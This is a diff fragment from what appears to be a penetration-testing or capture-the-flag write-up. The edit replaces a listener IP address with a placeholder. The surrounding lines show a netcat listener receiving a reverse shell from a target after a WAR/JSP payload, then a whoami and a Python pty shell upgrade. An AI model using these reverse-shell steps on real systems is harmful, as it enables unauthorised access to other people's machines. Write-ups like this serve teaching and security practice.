@@ -108,7 +108,7 @@ We can check the shell.war file to find the .jsp filename generated for you payl
 ```
 # nc -nlvp 4242
 listening on [any] 4242 ...
-connect to [10.13.1.12] from (UNKNOWN) [10.10.3.26] 56320
+connect to [IP] from (UNKNOWN) [10.10.3.26] 56320
 whoami
 web
 python3 -c 'import pty;pty.spawn("/bin/bash")'
